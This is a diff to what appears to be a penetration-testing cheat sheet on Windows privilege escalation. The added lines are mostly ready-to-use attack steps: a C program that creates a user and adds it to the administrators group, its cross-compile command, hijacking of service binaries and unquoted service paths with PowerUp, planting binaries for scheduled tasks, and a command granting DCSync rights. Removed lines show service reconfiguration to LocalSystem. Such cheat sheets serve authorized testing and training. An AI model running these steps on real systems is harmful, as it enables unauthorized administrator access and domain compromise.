@@ -4443,54 +4443,144 @@ reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
 req query <REGISTRY_KEY>
 ```
 
-###### Modify Registry Key
+####### Modify Registry Key
 
 ```c
 reg add <REGISTRY_KEY> /v <VALUE_TO_MODIFY> /t REG_EXPAND_SZ /d C:\PATH\TO\FILE\<FILE>.exe /f
 ```
 
-##### Insecure Service Permissions
+##### Running Services Enumeration
 
 ```c
-accesschk64.exe -qlc <SERVICE>
-icacls C:\Users\<USERNAME>\<FILE>.exe /grant Everyone:F
-sc config <SERVICE> binPath= "C:\Users\<USERNAME>\<FILE>.exe" obj= LocalSystem
-sc stop <SERVICE>
-sc start <SERVICE>
+Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
 ```
 
-##### Service Handling
+###### Service Configuration Enumeration
 
 ```c
-sc create <SERVICE_NAME>
-sc start <SERVICE_NAME>
-sc qc <SERVICE_NAME>
+Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like '<SERVICE>'}
 ```
 
-##### Scheduled Tasks
+###### Permission Table
+
+| Mask | Permissions |
+| --- | --- |
+| F | Full access |
+| M | Modify access |
+| RX | Read and execute access |
+| R | Read-only access |
+| W | Write-only access |
+
+###### Permission Enumeration
 
 ```c
-schtasks
-schtasks /query /tn <TASK> /fo list /v
-schtasks /run /tn <TASK>
-Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
+icacls "C:\PATH\TO\BINARY\<BINARY>"
+```
+
+###### Permissions Abuse
+
+###### adduser.c
+
+```c
+#include <stdlib.h>
+
+int main ()
+{
+  int i;
+  
+  i = system ("net user <USERNAME> <PASSWORD> /add");
+  i = system ("net localgroup administrators <USERNAME> /add");
+  
+  return 0;
+}
+```
+
+###### Compiling
+
+```c
+x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
+```
+
+###### Execution
+
+```c
+net stop <SERVICE>
+net start <SERVICE>
+```
+
+or 
+
+```c
+shutdown /r /t 0
+Get-LocalGroupMember administrators
+```
+
+###### PowerView Example
+
+```c
+powershell -ep bypass
+. .\PowerUp.ps1
+Get-ModifiableServiceFile
+Install-ServiceBinary -Name '<SERVICE>'
+```
+
+###### Service Execution Properties Enumeration
+
+```c
+$ModifiableFiles = echo 'C:\PATH\TO\BINARY\<BINARY>.exe' | Get-ModifiablePath -Literal
+$ModifiableFiles
+$ModifiableFiles = echo 'C:\PATH\TO\BINARY\<BINARY>.exe argument' | Get-ModifiablePath -Literal
+$ModifiableFiles
+$ModifiableFiles = echo 'C:\PATH\TO\BINARY\<BINARY>.exe argument -conf=C:\temp\path' | Get-ModifiablePath -Literal
+$ModifiableFiles
 ```
 
 ##### Unquoted Service Paths
 
-Search for `Unquoted Service Paths` by using `sc qc`.
+###### Search Order
 
 ```c
-sc qc
-sc qc <SERVICE>
-sc stop <SERVICE>
-sc start <SERVICE>
+C:\example.exe
+C:\Program Files\example.exe
+C:\Program Files\my example\example.exe
+C:\Program Files\my example\my example\example.exe
 ```
 
+###### Service Path Enumeration
+
+Place a `.exe` file in the desired folder, then `start` or `restart` the `service`.
+
 ```c
-icacls <PROGRAM>.exe
-icacls C:\PROGRA~2\SYSTEM~1\<SERVICE>.exe
-icacls C:\PROGRA~2\SYSTEM~1\<SERVICE>.exe /grant Everyone:F
+Get-CimInstance -ClassName win32_service | Select Name,State,PathName
+wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
+Start-Service <SERVICE>
+Stop-Service <SERVICE>
+icacls "C:\"
+icacls "C:\Program Files"
+icacls "C:\Program Files\my example"
+Start-Service <SERVICE>
+Get-LocalGroupMember administrators
+```
+
+###### PowerView Example
+
+```c
+powershell -ep bypass
+. .\PowerUp.ps1
+Get-UnquotedService
+Write-ServiceBinary -Name '<SERVICE>' -Path "C:\Program Files\my example\example.exe"
+Start-Service <SERVICE>
+Get-LocalGroupMember administrators
+```
+
+##### Scheduled Tasks Enumeration
+
+Place a `.exe` file in the desired folder and wait for the `scheduled task` to get `executed`.
+
+```c
+schtasks /query /fo LIST /v
+icacls C:\PATH\TO\BINARY\<BINARY>.exe
+Get-LocalGroupMember administrators
 ```
 
 ##### writeDACL
@@ -4501,13 +4591,6 @@ icacls C:\PROGRA~2\SYSTEM~1\<SERVICE>.exe /grant Everyone:F
 $SecPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
 $Cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USERNAME>', $SecPassword)
 Add-ObjectACL -PrincipalIdentity <USERNAME> -Credential $Cred -Rights DCSync
-```
-
-##### WMIC
-
-```c
-wmic product get name,version,vendor
-wmic qfe get Caption,Description,HotFixID,InstalledOn    # no new patches - KEXP pretty likely
 ```
 
 #### PassTheCert
